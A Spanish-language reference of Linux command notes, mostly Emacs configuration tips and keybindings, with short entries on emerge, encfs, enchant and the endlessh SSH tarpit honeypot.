	ESP (Saltar la palabra)
	r (modificar personalmente)
	dígito (Substituir palabra por la del dígito pulsado)
	a (Aceptar la palabra incorrecta)
	i (incorporar palabra al diccionario personal)
	C-g (Salir de corrección. Con C-u M-$ vuelve a corrector)
	q (Salir de corrector)
	C-l (Actualizar pantalla)
Corregir un texto en tiempo real:
	M-x flyspell-mode
Opciones en este modo:
	M-$ (Sobre la palabra mal escrita para ver opciones)
Tambien podemos activar por defecto las correcciones añadiendo en .emacs:
	(setq-default flyspell-mode t)
Para los comentarios en los lenguajes de programación:
	M-x flyspell-prog-mode
Para los comentarios en modo latex añadir en .emacs:
	(add-hook 'LaTeX-mode-hook 'flyspell-mode)
5.-
Recargar archivo de configuración .emacs despues de una modificación:
	M-x load-file (Cuando solicite el nombre del archivo colocar .emacs)
	M-x eval-buffer (Si el archivo .emacs se encuentra en un buffer)
6.-
Conectar a un servidor ssh:
Descargar tramp de <http://ftp.gnu.org/gnu/tramp/> descomprimir y mover la carpeta al directorio ~/emac.d/ . En el archivo de configuración .emacs añadir las lineas:
	(require 'tramp)
	(setq tramp-default-method "ssh")
Y si queremos activar variables para debuggear problemas añadir:
	(setq tramp-debug-buffer t)
	(setq tramp-verbose 10)
Abrir sesión de emacs y acceder al host remoto empleando alguno de los siguientes metodos según nuestro /etc/hosts:
	C-x C-f /ssh:USER@host_remoto:/home/USER/
	C-x C-f /USER@host_remoto:/home/USER
	C-x C-f /host_remoto:/home/USER
Y si el puerto es distinto del 22, añadiendo a las opciones anteriores #puerto al estilo:
	C-x C-f /ssh:USER@host-remoto#2222:/home/USER
Pedirá contraseña.
Nota.- Después de pulsar el atajo, no olvidar borrar la referencia al directorio local ~/ dejándolo en /
7.-
Temas de colores:
Descargar el paquete tar.gz de:  <http://download.gna.org/color-theme/>
Una vez decomprimido mover la carpeta a ~/.emacs.d:
	~/.emacs.d/color-theme
Y añadir a .emacs las lineas:
	(add-to-list 'load-path (expand-file-name "~/.emacs.d/color-theme/"))
	(require 'color-theme)
	(color-theme-initialize)
Arrancar emacs y:
	M-x color-theme-select
Mostrará en un nuevo buffer una lista de temas disponibles que podrán probarse seleccionandolos con "intro" o la tecla "i". Una vez escogido el tema, pulsando la letra d, muestra la linea que ha de entrarse en .emacs. Supongamos que escogemos Charcoal Black, añadiremos la linea (color-theme-charcoal-black) quedando toda la entrada:
	(add-to-list 'load-path (expand-file-name "~/.emacs.d/color-theme/"))
	(require 'color-theme)
	(color-theme-initialize)
	(color-theme-charcoal-black)
Otros comandos reelacionados con colores:
	M-x set-foreground-color (Pedirá color para las fuentes).
	M-x set-background-color (Pedirá color para el fondo)
	M-x set-face-foreground (Afinar más el color de las fuentes según modos)
	M-x set-face-background (Afinar más el color de fondo según modos))
	M-x list-colors-display (Listado, muestra y código de colores disponibles)
8.-
Consultando directorios: dired, navegador de archivos de emacs [C-x d].
	g (Despues de una modificación actualiza la pantalla)
	v (Muestra el archivo en modo solo-lectura
	q (Regresa al listado)
	e [enter] (Editar el archivo)
	d (Marca un archivo para su eliminación colocando una "D" en la 1ª columna)
	u (Elimina la marca anterior)
	x (Elimina los archivos marcados con una "D")
	D (Eliminación inmediata)
	C (Copiar)
	3C (Copiar el archivo de la linea del cursor y los 3 siguientes)
	R (Renombrar o mover)
	Z (Comprimir descomprimir [compress (.z .Z) y gzip (.gz)])
	X (Entrar comandos de shell [chmod, grep, find, sort ...])
	+ (Crear directorio)
	** (Marcar todos los ejecutables)
	*/ (Marca todos los directorios)
	*! (Desmarca todo)
	M (Cambiar los permisos. Sólo poner la numeración [777, 755...])
	O (Cambiar el propietario)
	P (Imprimir el fichero. El comando lp imprimirá con la impresora predeterminada)
	h (Muestra la ayuda y todos los atajos de teclado)
	S (Crear un enlace simbólico)
Tambien es posible mostrar/ocultar detalles con: M-x dired-hide-details-mode
9.-
M-x term [Emulador de terminal]
Utiliza dos modos de entrada: El modo caracter que envia cada caracter de entrada directamente a la subshell, a excepción del carácter de escape [C-c] y el modo línea que actúa como modo Shell [Permite entrada de todas las combinaciones de teclas emacs, desplaza el cursor por la pantalla con las flechas, puede marcarse trozos de texto para copiar...]. Para alternar entre estos dos modos:
	C-c C-j (Cambia a modo línea)
	C-c C-k (Cambia a modo caracter)
Nota.- Puede que para alternar entre modos sea preciso hacerlo con M-x term-mode
Algunos detalles:
	Para substituir el nombre *terminal* por otro: M-x rename-buffer
	Consultar el historial de comandos con M-p (Hacia atras) y M-n (Hacia adelante)
10.-
Uso de sudo. Los mismos ejemplos sirven para su. Precisa tramp [ver ssh]. Entrar el siguiente código en .emacs autoexplicativo:
	;; Uso de sudo: C-x C-f /sudo::/etc/hosts
	;; C-x C-f /sudo:root@localhost:/etc/hosts  o C-x sudo-find-file
	(defun sudo-find-file (file-name)
	  "Like find file, but opens the file as root."
	  (interactive "FSudo Find File: ")
	  (let ((tramp-file-name (concat "/sudo::" (expand-file-name file-name))))
	  (find-file tramp-file-name)))
	;; Atajo de teclado para sudo:
	(global-set-key (kbd "C-x F") 'sudo-find-file)
11.-
Abrir archivos de dired con aplicaciones externas pulsando F8:
Copiar en .emacs el siguiente código:
	(defun external-app ()
	 "In dired, open the file named on this line."
	  (interactive)
	  (let* ((file (dired-get-filename nil t)))
		(call-process "xdg-open" nil 0 nil file)
	(global-set-key (kbd "<f8>") 'external-app)
12.-
Abrir archivos de dired con determinadas aplicaciones externas:
Descargar la libreria de <http://stud4.tuwien.ac.at/~e0225855/misc/openwith.el> y moverlo a la carpeta ~/.emacs.d/
Y copiar el siguiente codigó en ~/.emacs:
	(add-to-list 'load-path "~/.emacs.d/openwith.el")
	(require 'openwith)
	(setq openwith-associations '(("\\.pdf\\'" "evince" (file))))
	(setq openwith-associations '(("\\.flv\\'" "vlc" (file))))
	(openwith-mode t)
Colocar tantas lineas del tipo "(setq openwith-associations '(("\\.flv\\'" "vlc" (file))))" como archivos queramos asociar.
13.-
Algunos ajustes en el prompt de eshell que pueden incorporarse al archivo .emacs:
Modificar el prompt para mostrar el directorio de trabajol. Para mostrar el usuario: (concat (getenv "USER")
	(setq eshell-prompt-function
	(lambda nil
	(concat (eshell/pwd)
	(if (= (user-uid) 0) " # " " $ "))))
Usar bash en lugar de la shell de emacs:
	(setq shell-file-name "/bin/bash")
Modificar el mensaje de bienvenida al entrar en eshell:
	(setq eshell-banner-message "\n... entrant a  emacs shell...\n\n")
Incorporar colorines a las salidas de los comandos:
	(add-hook 'shell-mode-hook 'ansi-color-for-comint-mode-on)
Nota.- Si ya tenemos una terminal [eshell o term] abierta no permite abrir ninguna más a menos de que le cambiemos el nombre:
	M-x rename-buffer
14.-
Para poder copipastear de emacs a las X y viceversa colocar en .emacs el código:
	;; http://hugoheden.wordpress.com/2009/03/08/copypaste-with-emacs-in-terminal/
	(setq x-select-enable-clipboard t)
	(unless window-system
 	(when (getenv "DISPLAY")
 	(defun xsel-cut-function (text &optional push)
    (with-temp-buffer
    (insert text)
    (call-process-region (point-min) (point-max) "xsel" nil 0 nil "--clipboard" "--input")))
 	(defun xsel-paste-function()
    (let ((xsel-output (shell-command-to-string "xsel --clipboard --output")))
    (unless (string= (car kill-ring) xsel-output)
        xsel-output )))
    (setq interprogram-cut-function 'xsel-cut-function)
    (setq interprogram-paste-function 'xsel-paste-function)))
15.-
Operar con trozos seleccionados [C-espacio]
	C-x r s (copy-to-register) Ponerle un nombre y guardarla en un registro
	C-x r i (insert-register) Insertará el registro que le indiquemos
	M-x view-register (ver el contenido de un registro)
16.-
Disponer de un bloc de notas (M-x remember) en emacs que se lance con C-c &
$ cd ~/.emacs.d
$ git clone git://repo.or.cz/remember-el.git remember
Colocar en la configuración:
$ nano .emacs
Añadir las lineas:
	(add-to-list 'load-path "~/.emacs.d/remember")
	(require 'remember)
	(global-set-key (kbd "C-x &") 'remember)
Una vez entrado el texto pulsar C-c C-c para poner la fecha. Se guardan todas las notas en el fichero ~/.notes
17.-
Reemplazar texto:
M-x query-replace [M-x %] (Busca y pregunta antes de substituir)
Algunas opciones del comando:
	y (Reemplazar la coincidencia actual)
	n (No reemplazar la coincidencia actual)
	q (Reemplazar la coincidencia actual y salir)
	C-r (Ir al editor recursivo)
	! (Reemplazar todo)
	^ (Ir al anterior reemplazo)
	E (Editar la norma de reemplazo
M-x replace-string (Busca y reemplazar sin preguntar)
18.-
Instalar extensiones de emacs a partir de repositorios. Descargar el archivo package.el:
[package.es](http://repo.or.cz/w/emacs.git/blob_plain/1a0a666f941c99882093d7bd08ced15033bc3f0c:/lisp/emacs-lisp/package.el)
Y copiarlo en .emacs.d/
Colocar en .emacs las lineas:
	(add-to-list 'load-path (expand-file-name "~/.emacs.d/package.el"))
	(require 'package)
	(package-initialize)
	(setq package-archives '(("gnu" . "http://elpa.gnu.org/packages/")
	                         ("marmalade" . "http://marmalade-repo.org/packages/")
	                         ("melpa" . "http://melpa.milkbox.net/packages/")))
Teclas de control:
	M-x describe-mode (Listado de teclas de control)
	M-x package-list-package (Recargar la lista de paquetes)
	M-x package-menu-mode (Entrar en modo package)
Una vez entrado en el modo package:
	enter (muestra una descripción del paquete)
	i (Marcar para instalar)
	u (Desmarcar)
	d (Marcar para eliminar)
	x (Instalar o desinstalar un paquete)
	r (Resfrescar el listado)
19.-
Modo markdown. Descarga de la extensión: git clone git://jblevins.org/git/markdown-mode.git y colocar en .emacs.d/
	(add-to-list 'load-path "~/.emacs.d/markdown-mode")
	(autoload 'markdown-mode "markdown-mode" t)
	(add-to-list 'auto-mode-alist '("\\.markdown\\'" . markdown-mode))
	(add-to-list 'auto-mode-alist '("\\.md\\'" . markdown-mode))
Algunos atajos
	M-x markdown-mode (Entrar en modo markdown)
	C-c C-t 1 (fuente de mayor tamaño. Números de 2 al 6 ir decreciendo el tamaño)
	C-c C-h (Visualizar todas los comandos disponibles)
	C-c C-a l (insertar link con la forma [texto](URL))
	C-c C-a u (Insertar url)
	C-c C-c p (Ver la versión html del texto en pantalla y visualizarla en el navegador)
	C-c C-c L (insertar link referenciado)
	C-c C-c v (Visualizar la página en el navegador y exportar archivo a html)
	C-c - (Insertar linea)
	C-c C-c e (Exportar archivo a formato html con el mismo nombre)
	C-c C-x m (Insertar listado)
	C-c C-s b (Insertar cita)
	C-c C-s c (Insertar código)
	C-c C-s p (Insertar literal)
	C-c TAB i (Insertar imagen en formato: [texto](url))
20.-
Algunos atajos para el navegador w3m:
	B (w3m-view-preview-page) Ir a la pagina anterior
	N (w3m-view-next-page) Ir a la página siguiente
	I (w3m-view-image) Ver imagen con una aplicación externa
	A (w3m-bookmark-add-current-url) Afegir la url activa a les adreces d'interès
	M-a (w3m-bookmark-add-this-url) Afegir una url a les adreces d'interès
	v (w3m-bookmark-view) veure les adreces d'interès
	E (w3m-bookmark-edit) (Visitar l'arxiu de les adreces d'interès)
	C-k (w3m-bookmark-kill-entry) (Treure una url de les adreces d'interès)
21.-
Dando un pequeño formato a un texto (enriched-mode)
	M-x enriched-mode (Activa/desactiva el modo enriquecido)
	M-o d (por defecto)
	M-o b (negrita)
	M-o i (cursiva)
	M-o l (negrita y cursiva)
	M-o u (subrallado)
	M-x facemenu-set-foreground (cambiar el color de la letra del texto marcado y de lo que se escriba a continuación)
	M-x facemenu-set-background (cambiar el color de fondo del texto marcado y de lo que se escriba a continuación.
	M-x find-file-literally (abrir el fichero "literalmente" sin el modo "enriched" pero viendo los comandos de formato)
22.-
Algunas opciones posibles al listar buffer con C-x C-b
	n (siguiente buffer de la lista)
	p (buffer anterior de la lista)
	d (marcar buffer para eliminación)
	% (marcar o desmarcar buffer como sólo lectura)
	m (marcar buffer para ser mostrado)
	u (desmarcar buffer)
	Del (desmarcar buffer marcado con "u")
	o (reemplazar la otra ventana con el buffer actual)
	1 (mostrar buffer en pantalla completa)
	2 (mostrar los siguientes 2 buffers en ventana horizontal)
	v (mostrar los buffers marcados por "m")
	x (ejecutar comandos de marcado)
	q (salir del listado de buffers)
23.-
Algunas opciones al listar marcadores (C-x r l)
	d (marcar para eliminar)
	x (Ejecutar la eliminación)
	r (cambiar nombre del marcador)
	s (guardar listado)
	f (mostrar el marcador)
	t (Mostrar/ocultar la ruta a los ficheros)
	q (salir)
24.-
Grabar macros
	C-x ( (Empezar a grabar secuencia de caracteres)
	C-x ) (Terminar la grabación)
	C-x e (Reproducir la macro grabada)
Si quremos un atajo para reproducir la última macro grabada con, por ejemplo Mayuscula F1, colocar en .emacs:
	(global-set-key [(shift f1)] 'call-last-kbd-macro)
25.-
Algunos atajos de latex-mode, auctex y reftex
        C-c TAB (Página info de auctex)
        C-c * (Selecciona la sección actual)
        C-c ' (Marca como comentario todo el párrafo)
        C-c ; (Marca como comentario toda la zona previamente seleccionada)
        C-c : (Elimina comentarios de la zona previamente seleccionada)
        C-c " (Elimina comentario de una linea)
        C-c { (Inserta aturomaticamente las llave de apertura y de cierre)
        C-c ] (Cierra un entorno)
        C-c C-e (insertar automática el par de órdenes de apertura y cierre de un entorno)
        ESC TAB (Autocompletado al empezar una etiqueta con \)
        C-c C-m (al empezar a teclear el nombre del macro lo autocompleta y lo inserta
        M-C-a (Va a la línea de apertura del entorno actual)
        M-C-e (Va a la línea de cierre del entorno actual)
        C-u (Sustituye el formato actual por el que se indique)
        C-c C-s (Preguntará por tipo de unidad a insertar. Por defecto igual que la actual)
        C-u C-c C-s (sugerirá el nivel inmediatamente inferior al actual)
Especificación de formatos para letras:
        C-c C-f C-r (\textrm{} Inserta texto roman)
        C-c C-f C-f (\textsf{} Inserta texto sanserif)
        C-c C-f C-t (\texttt{} Inserta texto tipo máquina de escribir)
Especificación por trazo e inclinación:
        C-c C-f C-b (\textbf{} Inserta texto en negrita (trazo grueso))
        C-c C-f RET (\textmd{} Inserta texto normal (trazo medio))
        C-c C-f C-i (\textit{} Inserta texto en cursiva)
        C-c C-f C-s (\textsl{} Inserta texto inclinado)
        C-c C-f C-e (\emph{} Inserta texto enfatizado)
Otras especificacion es de formato:
	C-c C-f C-u (\textup{} Inserta texto de perfil recto)
        C-c C-f C-c (\textsc{} Inserta texto en versales)
        C-c C-f C-n (\textnormal{} Inserta texto normal)
        C-c C-f C-d (Borra la especificación de formato actual)
        C-c C-q C-r (Indentar párrafo seleccionado)
        C-c C-q C-p (Reformatea un párrafo a 70 caracteres por linea)
Activando el modo menor "outline" (M-x outline-minor-mode) podemos acceder a los siguientes atajos:
        C-c @ C-t (Pliega las secciones)
        C-c @ C-a (Despliega las secciones)
        C-c @ C-n (Próximo título)
        C-c @ C-p (Título anterior)
        C-c @ C-f (Próximo título del mismo nivel
        C-c @ C-b (Anterior título del mismo nivel)
        C-c @ C-u (Título del nivel inmediatamente superior)
Ver estructura del documento (M-x reftex-mode):
        C-c = (Abre un ventana con la estructura del documento)
Algunas teclas disponibles en esta ventana en reftex-mode:
        ? (Muestra sumário y opciones disponibles)
        q (Cierra la ventana)
        k (Cierra ventana y elimina el buffer)
        ESP (Muestra en la otra ventana lo seleccionado)
        f (Activa/desactiva mostrar donde estamos en la otra ventana en tiempo real)
        TAB (Movernos a la otra ventana correspondiente al título seleccionado)
        RET (Oculta la ventana del indice y el cursor va al título seleccionado)
        g (Actualizar el buffer)
Referencia a las etiquetas:
        C-c ) (Abre una ventana con las referencias)
Algunas teclas disponibles en la ventana de etiquetas:
        RET (buscar etiquetas de todo tipo)
        e (buscar etiquetas de tipo equation)
        f (buscar etiquetas de tipo figure)
        i (buscar etiquetas de tipo enumerate)
        n (buscar etiquetas de tipo footnote)
        N (buscar etiquetas de tipo endnote)
        s (buscar etiquetas de tipo section)
        t (buscar etiquetas de tipo table)
Una vez escogida las etiquetas a mostrar se abre una ventana con las siguientes opciones:
        ? (Muestra opciones disponibles)
        q (Cierra el buffer)
        s (Cambia el tipo de etiqueta que se está buscando)
        SPC (Mostra en la otra ventana lugar de la etiqueta seleccionada)
        f (Activa/desactiva mostrar donde estamos en la otra ventana en tiempo real)
Comandos externos.
        C-c C-c (La primera vez que se ejecuta, compila. La segunda muestra el pdf)
        C-c C-v (Mostrar directamente el pdf)
        C-c C-w (Activa/desactiva mostrar como error desbordamientos de cajas de texto)
        C-c ` (Muestra la linea en la que se produce un error)
26.-
Función que abre en firefox una url, un link o una imagen sobre la que se encuentra el cursor en un archivo de texto pulsado C-c b:
	(defun w3mext-open-link-or-image-or-url ()
	    (interactive)
	    (let (url)
	    (if (string= major-mode "w3m-mode")
	        (setq url (or (w3m-anchor) (w3m-image) w3m-current-url)))
	        (browse-url-generic (if url url (car (browse-url-interactive-arg "URL: "))))
	        ))
	(global-set-key (kbd "C-c b") 'w3mext-open-link-or-image-or-url)
27.-
Navegador eww [nativo de emacs escrito en elisp y disponible a partir de la versión 24.4]. Se abre con M-x eww. Si el texto ingresado no tiene forma de URL realizará la busqueda en DuckDuckGo.
Algunos atajos:
	q (salir)
	g (recargar la página)
	w (copiar la URL actual al kill ring)
	d (descargar la URL bajo el cursor)
	l (ir  a la página anterior)
	r (ir a la página siguiente)
	H (ver historial de sitios visitados. Se pierde al cerrar eww)
	& (abrir la URL actual en un navegador web externo)
	v (ver código fuente. Se copia en un buffer nuevo y se activa html-mode si está disponible)
28.-
Sincronizar los marcadores de firefox con emacs:
Para guardar los marcadores de firefox al pulsar una combinación de teclas en un fichero org de emacs y, simultaneamente, que el navegador interprete dicho fichero como enlaces clicables precisamos insalar dos plugins en firefox:
     Org capture: http://chadok.info/firefox-org-capture/
     Linkification: http://yellow5.us/firefox/linkification/
Dejar visible la barra de marcadores (View -> Toolbars -> Bookmarks toolbar) y clicar sobre ella con el botón derecho, "Añadir dirección de interes" (Bookmarks toolbar), en "nombre" colocar el que se quiera, yo tengo Org_marcadores y en "ubicación" la ruta en la que queremos guardar el archivo de bookmarks: file:///home/usuario/.emacs.d/org/bookmarks.org o si hemos de sincronizar varios equipos, en dropbox: file:////home/usuario/Dropbox/org/bookmarks.org. Desactivar la casilla "Cargar este marcador en la barra lateral".
Luego, indicar el atajo para guardar los bookmarks en firefox y qué aplicacion usaremos para llamar a emacs:
"Herramientas" -> "Complementos" -> "Org mode capture" -> "Preferéncias", indicar en "emacsclient" la ruta al ejecutable "/usr/bin/emacsclient" y como "hotkey" el valor de "alt-r"
Y para terminar añadir al archivo de configuración .emacs las lineas:
	;;; Bookmarks pulsando M-r en firefox colocará en el archivo mencionado
	;;; la url(%l), pequeña descripción(%c) y fecha(%t)
	(server-start)
	(require 'org-protocol)
	(setq org-capture-templates
	(quote (("f" "Firefox" entry (file "/home/pep/.emacs.d/org/bookmarks.org")
	         "* %l %c %t\n")
	       )))
Un listado de como usar los templates (%l, %c, %t...) en: https://www.gnu.org/software/emacs/manual/html_node/org/Template-expansion.html#Template-expansion
Proceso: Con emacs abierto como servidor o lanzando desde el propio emacs M-x server-start, vamos a firefox y, estando en una página que queremos añadir a marcadores, pulsamos Alt-r. Se abrirá una ventana de emacs preguntando como queremos guardar el link y pulsamos "f" (firefox) ya continuación C-c C-c. Cerramos la ventana. Podemos acceder a los marcadores ya sea desde las direcciones de interés del navegador o desde el archivo .emacs.d/org/bookmarks.org de emacs.
29.-
Algunos notas sobre git: magit
	M-x magit-status (Acceso a magit para activar los siguientes atajos)
	s (Organizar archivos)
	cc (escribir el mensaje del commit. Una vez entrado el texto con C-c C-c para el commit)
	Pu (git push [M-x magit-push-current])
	Fu (git pull [M-x magit-pull-current])
	ll (git log [M-x magit-log-current])
30.-
elfeed, lector de noticias
elfeed-load-opml (Importar un archivo de feeds. El contenido se coloca en el archivo de configuración .emacs)
	G (actualizar fuentes)
	r (Marcar noticia como leída)
	u (Marcar noticia como no leída)
	REF (Abrir noticia en el buffer)
	b (Abrir noticia en el navegador por defecto)
Ejemplo de entradas:
	(setq elfeed-feeds
	  '("http://xiquetam.blogspot.com/feeds/posts/default"
		"http://www.genbeta.com/atom.xml"
		"http://www.linux-party.com/backend.php"
		"http://www.theinquirer.es/feed/atom"
		;; más entradas
		))
Aguardar respuesta del host 30 segundos:
	 (setf url-queue-timeout 30)
Modificar ciertas variables de color si no se visualizan bien:
	  (custom-set-faces
	   '(elfeed-search-date-face ((t (:background "black" :foreground "white"))))
	   '(elfeed-asearch-date-format (quote ("%d-%m-%Y" 10 :left)))
	   '(elfeed-search-feed-face ((t (:background "black" :foreground "white"))))
	   '(elfeed-search-title-face ((t (:background "black" :foreground "white")))))
Aumentar el espació para los titulares. Por defecto 70
	(custom-set-variables
	  '(elfeed-search-title-max-width 130))
31.-
Utilidades de red nativas de emacs (M-x ...)
ifconfig, ipconfig, iwconfig, netstat, arp, route, traceroute, ping, nslookup-host, nslookup, dns-lookup-host, run-dig, dig, ftp, smbclient, smbclient-list-shares, finger, whois y whois-reverse-lookup.
No es necesario ajustes especiales en .emacs, pero puede personalizarse algún aspecto, por ejemplo que ping solo mande 3 paquetes:
	(setq ping-program-options '("-c" "3"))
32.-
impatient-mode
Permite mostrar los contenidos del búfer en una página web que se actualiza automáticamente cuando se realizan cambios.
	M-x httpd-start (Arranca el servidor)
Colocarse en el buffer que quiere compartirse y:
	M-x impatient-mode
En cualquier ordenador de la red se accede al buffer con la dirección: http://IP_o_host:8080/imp/
33.-
Otros ajustes que pueden incorporarse a .emacs precedidas con la explicación comentada:
	;;Mostrar consola al pulsar F5:
	(global-set-key (kbd "<f5>") 'eshell)
	;;Especificar número de espacios en las tabulaciones.
	(setd-default  tab-width  4)
	;;Mostrar reloj y con formato 24 horas
	(setq display-time-24hr-format t)
	(display-time)
	;;Descomprimir archivos.
	(auto-compression-mode t)
	;;Reemplazar "yes" y "no" por "y" y "n" en el prompt.
	(fset 'yes-or-no-p 'y-or-n-p)
	;;Sin copias de seguridad.
	(setq make-backup-files nil)
	;; Embellecer el calendario:
	(setq view-diary-entries-initially t
	mark-diary-entries-in-calendar t
	number-of-diary-entries 7)
	(add-hook 'diary-display-hook 'fancy-diary-display)
	(add-hook 'today-visible-calendar-hook 'calendar-mark-today)
	;; Poner en español el calendario:
	(setq calendar-week-start-day 1
	calendar-day-name-array
    ["Domingo" "Lunes" "Martes"
    "Miercoles" "Jueves" "Viernes" "Sábado"]
    calendar-month-name-array
    ["Enero" "Febrero" "Marzo" "Abril"
    "Mayo" "Junio" "Julio" "Agosto" "Septiembre"
    "Octubre" "Noviembre" "Diciembre"])
	;; Suprimir espacios al final de la linea y lineas en blanco del final:
	(add-hook 'before-save-hook 'delete-trailing-whitespace)
	;; Guardar la sessión al cerrar emacs y restaurarla al arrancar nuevamente:
	;; Colocar a cero [0] para desactivar:
	(desktop-save-mode 1)
	;; Colocar el tipo de sistema
	(defun insert-system-type()
	(interactive)
	(insert (format "%s" system-type)))
	;; Colocar el nombre del sistema
	(defun insert-system-name()
	(interactive)
	(insert (format "%s" system-name)))
	;; Listar y posibilidad de abrir un buffer cerrado anteriormente
	(require 'recentf)
34.-
Uso de algunos paquetes:
lorem-ipsum.- Coloca sentencias o párrafos en un archivo de texto:
C-u 10 M-x lorem-ipsum-insert-paragraphs (Insertar 10 párrafos)
screenshot.- Capturas de pantalla:
M-x screenshot (Pregunta nombre para la captura y scheme (con TAB muestra opciones). Al pulsar C-c C-c el puntero del ratón se convierte en una cruz para seleccionar la zona)
memory-usage.- Muestra estadistica de la memoria usada por emacs
M-x memory-usage
35.-
Suprimir el error:
warning: desktop file appears to be in use by PID XXXX.
Using it may cause conflicts. Use it anyway? (y or n)
$ mr ~/.emacs.d/.emacs.desktop.lock


emacs25-common-non-dfsg
Documentación central de Emacs: páginas de información, manual de referencia e introducción a Emacs Lisp. Este paquete contiene la infraestructura, independiente de la arquitectura, que no cumple con las pautas de software libre de Debian. En particular, esto incluye algunas de las páginas de información de GNU Emacs que están cubiertas bajo la licencia GFDL.
$ nano /usr/share/doc/emacs25-common-non-dfsg/README.Debian


emacs-intl-fonts
Paquete que incluye fuentes BDF para imprimir amárico, árabe, cantonés, chino, checo, danés, holandés, esperanto, estonio, finlandés, francés, alemán, griego, hebreo, hindi, italiano, japonés, coreano, maltés, noruego, polaco y ruso. , texto en eslovaco, español, sueco, tailandés, tigrinya, turco y vietnamita como PostScript en mapa de bits.


emd
Herramienta que se utiliza para procesar archivos escritos en Markdown.
$ emd documento.md -o documento.html (generará un archivo documento.html que contendrá el texto formateado como HTML)


emerge
Instalador de paquetes de gentoo aunque en realidad, emerge no es en si un instalador de paquetes, si no que se descargan las fuentes y se compilan para nuestro sistema.
# emerge -s paquete (Busca el paquete en el portage)
# emerge paquete (Instala el paquete.
# emerge -p paquete (Muestra las dependencias para instalar el paquete)
# emerge -f paquete (Descarga el paquete pero no lo compila)
# emerge -u paquete (Actualiza el paquete)
# emerge -C paquete (Desinstala el paquete)
# emerge sync (Actualiza el repositorio de paquetes del portage)
# emerge world (Reinstala todo el sistema. No recomendado)
# emerge -u world (Actualiza la distribución)
# emerge -b paquete (Compila el programa, lo instala y nos genera el binario)
# emerge -k paquete (Instala un paquete binario anteriormente compilado)
# emerge -k paquete (Reinstala un paquete del que ya tenemos el binario)
# emerge --update --deep --newuse world (Limpia de paquetes obsoletos)
# emerge –depclean (Continuar con depclean)
# revdep-rebuild (Y terminar. Precisa paquete gentoolkit)
# emerge --update --deep --with-bdeps=y --newuse world (Actualización completa del sistema cuando se ha modificado el /etc/make.conf)
# emerge --update --deep world (Actualizar con las dependencias)
# emerge --resume (Proseguir la compilación despues de pararla con Ctrl + c)


emmax
[Efficient Mixed-Model Association eXpedited]. Herramienta bioinformática utilizada en estudios de asociación del genoma completo [Genome-Wide Association Study - GWAS] para identificar variantes genéticas asociadas con rasgos fenotípicos, teniendo en cuenta la estructura de la población y las relaciones de parentesco. EMMAX utiliza formatos .BED para genotipos y archivos de texto para fenotipos.
$ emmax-kin -v -h -s -d 10 genotipos.bed (genera la matriz de parentesco a partir del archivo de genotipos en formato BED)
$ emmax -v -d 10 -t genotipos -p fenotipos.txt -k genotipos.hIBS.kinf -o resultados (realiza el análisis de asociación utilizando los archivos especificados y genera los resultados en un archivo de salida)


emms
[Emcs Multimedia System]. Reproductor de música propio de emacs. Ver emacs para configuración.
Algunas funciones para emacs:
	emms-play-file (Entrar un archivo para reproducir)
	emms-play-directory (Entrar un directorio)
	emms-play-url (una url)
Atajos básicos:
	s (Stop)
	n (Siguiente canción)
	p (Canción anterior)
	q (Salir)


emms-print-metadata
Imprimirá metadatos sobre archivos de música, para ser usados principalmente por EMMS, el Sistema MultiMedia de Emacs.
$ emms-print-metadata file.mp3


empty
Proporciona una interfaz sencilla para ejecutar y/o interactuar con procesos en sesiones de pseudo-terminales. Esta herramienta es útil en la programación de scripts shell que se utilizan para comunicarse con programas interactivos como telnet o ftp.
$ empty -f -L empty.log telnet localhost (mostrar la salida vacia pero las incidencias en empty.log)
$ empty -l (lista los trabajos creados por la shell)


enable
Permutar la ejecución de un comando de bash como ejecutable interno [por ejemplo: cd] y ejecutable externo [por ejemplo: /bin/cd]. Algunas shells precisan que determinados comandos se ejecuten de forma externa, o sea indicando su ruta al ejecutable. Por defecto un comando siempre se ejecuta de forma interna.
$ enable -a (Ver todos los comandos internos y si están habilitados)
$ enable -n cd (desactiva la ejecución del comando de forma interna)
$ enable cd (lo vuelve a activar)
$ enable -p (lista todos los comandos que se ejecutan internamente)
$ enable -n (muestra los desactivados).


encfs
Encriptar directorios.
# mkdir .cripta cripta  (Crear los directorios)
# encfs /home/usuario/.cripta /home/usuario/cripta (Montarlos especificando la ruta absoluta al directorio /home/usuario.)
La primera vez que lo usemos solicitará si lo configuramos en modo experto [x] , o preconfigurado [p] tecleamos "p" y solicitará la contraseña
# fusermount -u /home/usuario/cripta/ (desmontar el volumen)
# encfsctl passwd /home/usuario/.cripta (cambiar la contraseña)
# encfsctl (Mostrar más opciones)
La siguiente vez que lo montemos solo nos pedirá la contraseña
# encfs /home/usuario/.cripta /home/usuario/cripta
Aunque siempre se trabaje en el directorio /home/usuario/cripta, los datos estarán realmente en /home/usuario/.cripta donde siempre permanecen encriptados en tiempo real. Si intentamos visualizarlos:
# ls /home/usuario/.cripta
Nos da solamente un numeraco: et5bDtRAOe1F5P0crhyOlYYH


enchant-2
Corrector ortográfico
$ enchant-2 -a (modo interartivo que va corrigiendo las frases que se entran por teclado)
$ enchant-2 -l text.txt (enumerar solo las faltas de ortografía)


enchant-lsmod-2
Proporciona información sobre los proveedores del corrector ortográfico de Enchant y los diccionarios que ofrece cada uno.
$ enchant-lsmod-2 (lista los proveedores disponibles)
$ enchant-lsmod-2 -list-dicts (lista todos los diccionarios disponibles)
$ enchant-lsmod-2 -lang es (Muestra qué proveedor y diccionario se utilizará para el idioma indicado)


endlessh
es un honeypot diseñado para ralentizar los intentos de escaneo y ataque automatizados contra el servicio SSH. Funciona respondiendo lentamente con un banner SSH interminable, manteniendo a los bots y atacantes ocupados sin permitirles llegar al servicio SSH real. El propósito es poner su servidor SSH real en otro puerto y luego dejar que los bots abusivos se queden atrapados en este tarpit [agujero de alquitrán - ralentización de la conexión a una red o servicio] en lugar de molestar a un servidor real.
# endlessh -p 2223 (ejecutarlo en el puerto especificado, por defecto en el 2222)
# journalctl -u endlessh (revisar los intentos de conexión atrapados)
1.-
configurar como un servicio systemd
# nano /etc/endlessh/config
Co los siguientes parámnetros:
       PORT=2222
       DELAY=10000
       LOGFILE=/var/log/endlessh.log
Se especifica puerto de escucha, tiempo en milisegundos entre los bytes enviados [mayor retraso = bots más atrapados] y ruta del archivo de logs.
# systemctl enable endlessh (activar el servicio)
# nc localhost 2222 (probar si endlessh está funcionando, si queda colgado significa que endless está enviando un banner interminable)


enmime
Herramientas de codificación y decodificación de correo MIME en Go, enfocada en generar y analizar correos electrónicos codificados en MIME incluyendo archivos adjuntos y texto en diferentes codificaciones.. Contiene las utilidades mime-extractor y mime-dump.
